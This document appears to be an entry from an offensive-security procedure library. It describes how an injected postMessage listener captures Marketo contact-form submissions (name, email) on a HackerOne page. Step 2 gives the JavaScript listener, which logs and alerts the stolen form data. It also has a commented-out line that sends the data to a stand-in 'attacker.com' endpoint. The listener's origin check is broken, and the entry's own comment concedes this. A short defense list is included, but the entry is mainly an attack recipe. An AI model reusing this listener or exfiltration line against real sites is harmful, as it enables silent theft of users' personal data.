---
id: proc-capture-form-data
tags:
  - data-exfiltration
  - postmessage
  - form-interception
type: procedure
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.955Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Capture-Form-Submission-Data

## Summary

This procedure intercepts postMessage events sent by the Marketo form during submission on HackerOne, exfiltrating user inputs like name and email via the injected listener.

## Description

When the victim fills and submits the contact form, Marketo sends form data via postMessage to its parent. The malicious listener, injected in the iframe, captures these if not from 'marketo' origin, allowing eavesdropping. Prerequisites: Listener injection. Outcome: Data theft without direct domain access.

## Requirements

1. Active listener in target iframe
2. Victim interaction (form submit)
3. Exfil endpoint for real-world use

## Defense

Defensive measures and detection strategies:

- Encrypt or validate postMessage payloads
- Monitor for duplicate or anomalous listeners in iframes
- Implement form submission CSRF tokens and server-side validation

## Objectives

1. Intercept submission postMessage
2. Extract and exfiltrate data
3. Confirm theft via alert or log

## Instructions

### Step 1: Simulate or Await Submission

**Context**: Form submit triggers the event; listener handles automatically.

No manual command; victim action:

- Fill form fields (e.g., name: 'Test', email: 'test@example.com')
- Click submit

> Marketo sends: postMessage({formData: {...}}, origin)

### Step 2: Listener Interception

**Context**: Already injected code captures and alerts data.

From prior payload:

```javascript
window.addEventListener('message', function(e) {
  if (e.origin !== 'marketo') { // But actually captures form's internal msgs
    console.log('Captured:', e.data);
    // Exfil: new Image().src = 'https://attacker.com/log?' + encodeURIComponent(JSON.stringify(e.data));
    alert('I HAVE YOUR DATA NOW\n' + JSON.stringify(e.data));
  }
});
```

> Expected: Alert shows form fields; in production, data hits attacker server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[data-exfiltration]]
- [[postmessage]]
- [[form-interception]]
